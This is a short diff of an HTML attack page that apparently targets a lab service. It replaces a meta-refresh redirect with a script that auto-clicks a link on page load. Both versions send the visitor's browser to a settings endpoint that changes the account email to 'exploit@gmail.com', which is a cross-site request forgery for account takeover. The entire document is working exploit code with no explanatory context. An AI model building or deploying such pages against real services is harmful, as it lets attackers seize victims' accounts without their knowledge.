@@ -1,9 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta http-equiv="refresh" content="0;url=http://100.101.228.35:6009/settings/email?new=exploit@gmail.com">
-</head>
 <body>
-    <p>Loading...</p>
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            const a = document.createElement('a');
+            a.href = "http://100.101.228.35:6009/settings/email?new=exploit@gmail.com";
+            document.body.appendChild(a);
+            a.click();
+        });
+    </script>
 </body>
 </html>
